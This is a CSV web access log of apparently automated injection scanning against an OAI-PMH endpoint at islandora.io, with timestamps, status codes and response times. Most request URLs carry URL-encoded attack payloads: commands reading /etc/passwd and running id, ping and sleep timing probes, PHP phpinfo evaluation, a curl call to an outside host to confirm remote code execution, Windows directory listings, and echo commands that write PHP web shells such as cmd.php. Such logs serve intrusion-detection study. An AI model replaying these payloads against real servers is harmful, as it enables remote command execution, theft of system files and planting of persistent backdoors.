uuid,timestamp,http_status_code,request_url,response_time,http_version
f126b242-2fea-49a1-a367-7a9de92211e5,2025-01-01 15:39:37,200,http://islandora.io/oai/request?verb=%250Acat%2520%2Fetc%2Fpasswd,84.62 ms,HTTP/1.1
f99049c8-079c-42ce-8689-03ba8886fbd2,2025-01-01 15:39:37,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.51 ms,HTTP/1.1
781d69e1-d69e-48fd-b8c0-534ba2a3839f,2025-01-01 15:39:38,200,http://islandora.io/oai/request?verb=ListSets,48.72 ms,HTTP/1.1
7a22800f-9860-4d2a-be06-6e04f9be5c29,2025-01-01 15:39:38,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250Acat%2520%2Fetc%2Fpasswd,67.55 ms,HTTP/1.1
5560e7af-d049-4f28-aa8f-dfa18f06605e,2025-01-01 15:39:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Acat%2520%2Fetc%2Fpasswd,54.90 ms,HTTP/1.1
b97db37a-5d11-4ba0-881f-7963354f6ec6,2025-01-01 15:39:39,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Acat%2520%2Fetc%2Fpasswd&metadataPrefix=marc,46.94 ms,HTTP/1.1
ef21ae96-90f2-4ab9-83e7-878577aa3877,2025-01-01 15:39:39,200,http://islandora.io/oai/request?verb=%250Aid,50.73 ms,HTTP/1.1
c9faf4dc-29ca-41bd-a051-1808876159fb,2025-01-01 15:39:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250Aid,59.22 ms,HTTP/1.1
2bdf9889-210e-45e1-a93f-f47d993a48bd,2025-01-01 15:39:40,200,http://islandora.io/oai/request?verb=ListSets,48.84 ms,HTTP/1.1
145c6469-e377-42c9-8735-623a002b235c,2025-01-01 15:39:40,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,56.22 ms,HTTP/1.1
4afa88ca-a67c-4617-89c2-63e8295fb4bb,2025-01-01 15:39:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Aid&set=%250Aid,60.97 ms,HTTP/1.1
4ea9678b-ca00-46a7-823f-d831b463f5ac,2025-01-01 15:39:41,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid&metadataPrefix=oai_dc,56.60 ms,HTTP/1.1
61178dce-f111-4b87-ae95-87f4a5479f74,2025-01-01 15:39:41,200,http://islandora.io/oai/request?verb=%250Aid%250A,52.47 ms,HTTP/1.1
70801aed-8171-4320-9426-eafd7b6d2f8d,2025-01-01 15:39:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.54 ms,HTTP/1.1
421f5b70-de80-43c4-9002-20ff36d3f3df,2025-01-01 15:39:42,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250Aid%250A,51.70 ms,HTTP/1.1
4a77557e-3d37-43b2-87cf-615504174e11,2025-01-01 15:39:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%250Aid%250A,69.09 ms,HTTP/1.1
4e72e227-975b-4eec-8d01-840d038a85ff,2025-01-01 15:39:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250Aid%250A,116.52 ms,HTTP/1.1
e597c170-e31f-49f8-9021-b73be42af613,2025-01-01 15:39:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid%250A&metadataPrefix=marc,54.76 ms,HTTP/1.1
7941d3f9-6c86-422c-b3ea-66860d0d5cb8,2025-01-01 15:39:43,200,http://islandora.io/oai/request?verb=%250a,60.09 ms,HTTP/1.1
d6c25661-45f5-444d-b060-a3624b45978c,2025-01-01 15:39:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a,50.13 ms,HTTP/1.1
5bf014a3-d54a-4e6c-832c-5785514c3350,2025-01-01 15:39:44,200,http://islandora.io/oai/request?verb=ListSets,62.20 ms,HTTP/1.1
546b5e29-532b-4ba8-b357-3c0c6b1190ad,2025-01-01 15:39:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a&until=%250a,54.46 ms,HTTP/1.1
7786cffa-e62a-434a-8f4f-19bfe64020e1,2025-01-01 15:39:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250a&until=%250a,54.51 ms,HTTP/1.1
08ced842-cb9d-4828-b5f3-163d608d73ba,2025-01-01 15:39:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a&metadataPrefix=marc,46.92 ms,HTTP/1.1
4cf4687d-7491-4a85-abe6-6b9a308cb771,2025-01-01 15:39:45,200,http://islandora.io/oai/request?verb=%250a+id+%250a,75.75 ms,HTTP/1.1
8356e7b4-094f-4f3a-8424-66fb6cd0b66f,2025-01-01 15:39:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.55 ms,HTTP/1.1
cb6be272-75bb-461c-9066-a0711c44f1ff,2025-01-01 15:39:46,200,http://islandora.io/oai/request?verb=ListSets,52.66 ms,HTTP/1.1
0fdac73a-e156-480a-9928-43d64df56eb1,2025-01-01 15:39:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a+id+%250a&set=%250a+id+%250a,50.27 ms,HTTP/1.1
6300b90e-9493-47cf-9a67-f79a4cf6ac31,2025-01-01 15:39:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,54.59 ms,HTTP/1.1
81478b57-a431-4185-acc6-90cdc6c5cd17,2025-01-01 15:39:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+id+%250a&metadataPrefix=oai_dc,55.82 ms,HTTP/1.1
9359561b-a1fa-4381-b919-266c98743be4,2025-01-01 15:39:47,200,http://islandora.io/oai/request?verb=%250a+ping+-i+30+127.0.0.1+%250a,55.17 ms,HTTP/1.1
cbb5774e-3bb9-4905-8fed-74bc0d3e3431,2025-01-01 15:39:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.60 ms,HTTP/1.1
8458e897-ab28-44c1-9c88-483d3eaa7d03,2025-01-01 15:39:48,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a+ping+-i+30+127.0.0.1+%250a,59.57 ms,HTTP/1.1
1223f322-2502-44c1-b7ca-3e5a24bf6658,2025-01-01 15:39:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250a+ping+-i+30+127.0.0.1+%250a&set=%250a+ping+-i+30+127.0.0.1+%250a,39.74 ms,HTTP/1.1
3f655021-9567-41a3-98e6-35a10667a38f,2025-01-01 15:39:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250a+ping+-i+30+127.0.0.1+%250a,118.40 ms,HTTP/1.1
7c6183d6-d10b-47be-ae87-cd82b32295f1,2025-01-01 15:39:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+ping+-i+30+127.0.0.1+%250a&metadataPrefix=oai_dc,58.53 ms,HTTP/1.1
96585bf2-874b-4f91-97e0-eeeeb1bb3249,2025-01-01 15:39:49,200,http://islandora.io/oai/request?verb=%250a%250d,65.74 ms,HTTP/1.1
b73e593c-e077-482c-bac9-7a0c69d063ae,2025-01-01 15:39:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a%250d,45.89 ms,HTTP/1.1
2f6911d1-5ee8-4241-bb7d-9aeebb80c984,2025-01-01 15:39:50,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a%250d,51.59 ms,HTTP/1.1
f763aad7-e34b-4c51-90dc-0c71599bd3a9,2025-01-01 15:39:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a%250d&until=%250a%250d&set=%250a%250d,58.48 ms,HTTP/1.1
19ced174-00f9-4ee3-a14a-f8dd2d3a6bf1,2025-01-01 15:39:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250a%250d&until=%250a%250d,60.81 ms,HTTP/1.1
c016b359-26fb-48f4-a1b9-9ab854a91a64,2025-01-01 15:39:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a%250d&metadataPrefix=oai_dc,36.73 ms,HTTP/1.1
759885c2-28fb-459b-adeb-efef7f21d21c,2025-01-01 15:39:51,200,http://islandora.io/oai/request?verb=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,35.44 ms,HTTP/1.1
4ac8e0fa-9202-45e7-8e70-59176e16e774,2025-01-01 15:39:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,52.00 ms,HTTP/1.1
04b98665-039c-45a4-8f83-cad717a89cd2,2025-01-01 15:39:52,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,55.63 ms,HTTP/1.1
93164126-af5f-4b1b-a67e-ee7a792e9e8f,2025-01-01 15:39:52,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,60.96 ms,HTTP/1.1
c21c536f-f5e7-4652-832c-8b7c921fc7a4,2025-01-01 15:39:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&until=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,63.69 ms,HTTP/1.1
effc1ee8-aded-492e-9ca3-d32693b4fdb5,2025-01-01 15:39:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&metadataPrefix=marc,50.50 ms,HTTP/1.1
1e8f1ebe-0ab1-4217-99ad-57edcf4e7d7c,2025-01-01 15:39:53,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bphpinfo%28%29%7D%7D,57.17 ms,HTTP/1.1
bac5b87a-753e-4af8-9936-1a5031a8c6f0,2025-01-01 15:39:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D,57.88 ms,HTTP/1.1
d5cb1b4b-0d00-49b4-b744-3db66b9b74f3,2025-01-01 15:39:54,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bphpinfo%28%29%7D%7D,60.59 ms,HTTP/1.1
84eb21ac-e7dc-47b2-a5a8-9eef05bbb28d,2025-01-01 15:39:54,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D,36.03 ms,HTTP/1.1
45e76dd5-daff-418e-bf7c-39a04e871ab4,2025-01-01 15:39:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D&set=%2520%7B%24%7Bphpinfo%28%29%7D%7D,46.50 ms,HTTP/1.1
71e1f164-ec92-460d-b70e-c3c7aaed207e,2025-01-01 15:39:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D&metadataPrefix=oai_dc,62.08 ms,HTTP/1.1
9e68d501-1c02-4d09-af95-ad1860edb996,2025-01-01 15:39:56,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%2820%29%7D%7D,36.01 ms,HTTP/1.1
c14c91de-e35c-4f10-ae76-0f0e441f21a3,2025-01-01 15:39:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D,48.97 ms,HTTP/1.1
c2718fc3-8961-43f5-ab46-d9db9ea08130,2025-01-01 15:39:56,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%2820%29%7D%7D,56.96 ms,HTTP/1.1
cc010cdd-3898-4b47-9b70-ac7ac674ac4c,2025-01-01 15:39:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%2520%7B%24%7Bsleep%2820%29%7D%7D&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,52.01 ms,HTTP/1.1
ec53cf10-80a3-4450-bda1-ae677c77c611,2025-01-01 15:39:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%2520%7B%24%7Bsleep%2820%29%7D%7D,45.16 ms,HTTP/1.1
334d715b-0ae0-4f78-a1dc-272f6f1fcc7a,2025-01-01 15:39:57,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D&metadataPrefix=oai_dc,61.43 ms,HTTP/1.1
c5e7f8ea-33a6-40c9-999f-a0d983dcf7d3,2025-01-01 15:39:58,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%283%29%7D%7D,47.21 ms,HTTP/1.1
87c1f8f6-fa5d-4965-9036-486af4421336,2025-01-01 15:39:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.58 ms,HTTP/1.1
2070da50-8d01-4564-801f-cb7300302121,2025-01-01 15:39:58,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%283%29%7D%7D,58.78 ms,HTTP/1.1
92942cc7-a0b0-4c3e-8c01-479a9f3a1999,2025-01-01 15:39:59,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%2520%7B%24%7Bsleep%283%29%7D%7D&until=%2520%7B%24%7Bsleep%283%29%7D%7D,56.81 ms,HTTP/1.1
f53b4c97-dc75-4945-9485-5bbf71167617,2025-01-01 15:39:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%2520%7B%24%7Bsleep%283%29%7D%7D,50.43 ms,HTTP/1.1
c1bc042d-6d58-4919-a449-0d215bc8bf32,2025-01-01 15:39:59,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D&metadataPrefix=oai_dc,36.51 ms,HTTP/1.1
07be87f0-de8f-4fdd-8b46-7010cbc4d5e8,2025-01-01 15:40:00,200,http://islandora.io/oai/request?verb=%26,53.73 ms,HTTP/1.1
d3ddfc55-edc7-4d28-bfc1-49c4cc9d944c,2025-01-01 15:40:00,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26,45.32 ms,HTTP/1.1
33920712-1c7d-47b1-9579-cd1817926beb,2025-01-01 15:40:00,200,http://islandora.io/oai/request?verb=ListSets,51.55 ms,HTTP/1.1
1642e349-fd3c-41ec-b48a-280f0d0742fa,2025-01-01 15:40:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26&set=%26,55.56 ms,HTTP/1.1
9717a060-4598-4c0d-8cb2-3210938703e6,2025-01-01 15:40:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,108.43 ms,HTTP/1.1
ed0f86ca-c4c2-48e7-9fc3-117e9b831b5d,2025-01-01 15:40:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26&metadataPrefix=marc,54.41 ms,HTTP/1.1
a8b9d1b8-2785-4e5c-9222-d45d77b1ed56,2025-01-01 15:40:02,200,http://islandora.io/oai/request?verb=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,53.03 ms,HTTP/1.1
754542b9-68fc-4b18-b497-eee89c30d0b6,2025-01-01 15:40:02,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,56.75 ms,HTTP/1.1
296d0e0b-e197-41fc-a098-f672a72e495d,2025-01-01 15:40:02,200,http://islandora.io/oai/request?verb=ListSets,47.82 ms,HTTP/1.1
9683a213-f9df-496a-89b4-dc47397bcb2c,2025-01-01 15:40:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&set=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,59.94 ms,HTTP/1.1
940d5c56-9f62-43a9-b43e-fd540e0af872,2025-01-01 15:40:03,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,46.41 ms,HTTP/1.1
0f92668f-555c-4157-92a3-d8a0ca3e9a47,2025-01-01 15:40:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&metadataPrefix=marc,54.23 ms,HTTP/1.1
a94bed5c-4da0-469c-93c5-1fc279b6649d,2025-01-01 15:40:04,200,http://islandora.io/oai/request?verb=%26+dir,58.50 ms,HTTP/1.1
296f8246-203e-4b5f-8edb-5eeb96fa40b6,2025-01-01 15:40:04,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.40 ms,HTTP/1.1
fb612111-78de-4f34-9b37-d79cc10b62a8,2025-01-01 15:40:05,200,http://islandora.io/oai/request?verb=ListSets,58.85 ms,HTTP/1.1
4d6ecd8f-6269-48a9-a4c3-da55ebf8d51f,2025-01-01 15:40:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+dir&set=%26+dir,59.36 ms,HTTP/1.1
d8a75df8-e34b-4d22-ba77-970b9b180f8e,2025-01-01 15:40:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%26+dir,57.79 ms,HTTP/1.1
cef2d6af-f79a-4247-a898-e90380ce3307,2025-01-01 15:40:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir&metadataPrefix=oai_dc,48.62 ms,HTTP/1.1
26357a50-7ccf-4be2-bdee-72b091d01ebb,2025-01-01 15:40:06,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5C,49.31 ms,HTTP/1.1
c5e82418-ac37-4d9d-b12a-54a79f2d9771,2025-01-01 15:40:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5C,47.56 ms,HTTP/1.1
15afadf7-a217-4425-b78e-89acb8a90a36,2025-01-01 15:40:07,200,http://islandora.io/oai/request?verb=ListSets,53.63 ms,HTTP/1.1
46b98459-71ed-481a-a57c-b087c4415fe8,2025-01-01 15:40:07,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+dir+C%3A%5C,38.43 ms,HTTP/1.1
f6517622-0252-4ad9-bda4-a07afc50b3ce,2025-01-01 15:40:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26+dir+C%3A%5C,51.41 ms,HTTP/1.1
1dda970f-45d9-4ad2-945d-4e1549d31f2f,2025-01-01 15:40:08,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5C&metadataPrefix=oai_dc,70.34 ms,HTTP/1.1
25553e68-c204-4beb-9dce-e3eed7d730c4,2025-01-01 15:40:08,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,56.14 ms,HTTP/1.1
a47065e7-05a2-492b-af2e-a9991cab7db2,2025-01-01 15:40:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,51.48 ms,HTTP/1.1
aaedb11b-4f97-4332-94c1-d95c38cb707e,2025-01-01 15:40:09,200,http://islandora.io/oai/request?verb=ListSets,57.71 ms,HTTP/1.1
a7b8be6d-0348-4bd8-974e-6ee85d7cb988,2025-01-01 15:40:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,52.70 ms,HTTP/1.1
1eeb38b8-e827-41b5-920c-bc39a0682fa9,2025-01-01 15:40:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,56.67 ms,HTTP/1.1
d99c6d51-af96-4836-a3a1-ba2c95e32468,2025-01-01 15:40:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&metadataPrefix=marc,51.43 ms,HTTP/1.1
991be673-289d-4e40-a8b3-2cdd625e0fd8,2025-01-01 15:40:10,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CUsers,57.75 ms,HTTP/1.1
5a9a53ba-fd1b-49ed-ba79-9fc588b855d3,2025-01-01 15:40:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.59 ms,HTTP/1.1
cca0a4b2-1c5d-4b34-9dc2-e0743cce0ad2,2025-01-01 15:40:11,200,http://islandora.io/oai/request?verb=ListSets,54.61 ms,HTTP/1.1
d9c13c13-50ee-4905-8745-43350047fe4a,2025-01-01 15:40:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,59.27 ms,HTTP/1.1
f4e8c2f7-b1c3-47d3-9895-4ef8e25f948c,2025-01-01 15:40:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%26+dir+C%3A%5CUsers,58.63 ms,HTTP/1.1
1f315766-6bd1-4bf5-aab1-c2af460a9c10,2025-01-01 15:40:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CUsers&metadataPrefix=marc,35.38 ms,HTTP/1.1
15d8fef4-ff3a-4b98-b899-a437b6e2d212,2025-01-01 15:40:12,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,45.05 ms,HTTP/1.1
ee461e43-2ee0-4e45-b446-802cb21ada36,2025-01-01 15:40:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,37.98 ms,HTTP/1.1
81318c64-d4da-4203-a4a8-154b3a1a3216,2025-01-01 15:40:13,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,57.42 ms,HTTP/1.1
48495d2b-60cd-4290-99a4-8e7eb7ebb602,2025-01-01 15:40:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,63.52 ms,HTTP/1.1
54f50cee-753a-49d9-8b72-55e4d68ef45e,2025-01-01 15:40:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,59.97 ms,HTTP/1.1
5fefca94-e6e3-4cc1-a99b-a12a060d68ff,2025-01-01 15:40:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=oai_dc,40.90 ms,HTTP/1.1
ae1d12fb-3738-489e-a0e9-bba0ffca6df5,2025-01-01 15:40:14,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,53.73 ms,HTTP/1.1
4c8d749c-b09e-48ff-a3fc-49a569c049b6,2025-01-01 15:40:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,48.92 ms,HTTP/1.1
2e3c3b33-1466-413e-a305-1c1410b8e617,2025-01-01 15:40:15,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,49.36 ms,HTTP/1.1
d7ff24c2-4ae0-418b-b202-f3ec03b8b115,2025-01-01 15:40:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,37.16 ms,HTTP/1.1
40cfb314-61a3-403a-8021-b7210ece0014,2025-01-01 15:40:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,33.81 ms,HTTP/1.1
90ae82f2-46d5-4996-ae0e-76d9415f5fc5,2025-01-01 15:40:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&metadataPrefix=marc,60.20 ms,HTTP/1.1
65582091-272c-4580-b592-e79e90ac30a4,2025-01-01 15:40:16,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,54.88 ms,HTTP/1.1
f109872c-1dbd-4a4f-80e2-0c3b3fde9eac,2025-01-01 15:40:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.21 ms,HTTP/1.1
1e6884ae-3f1c-4c48-b964-83897b8dc22b,2025-01-01 15:40:17,200,http://islandora.io/oai/request?verb=ListSets,45.59 ms,HTTP/1.1
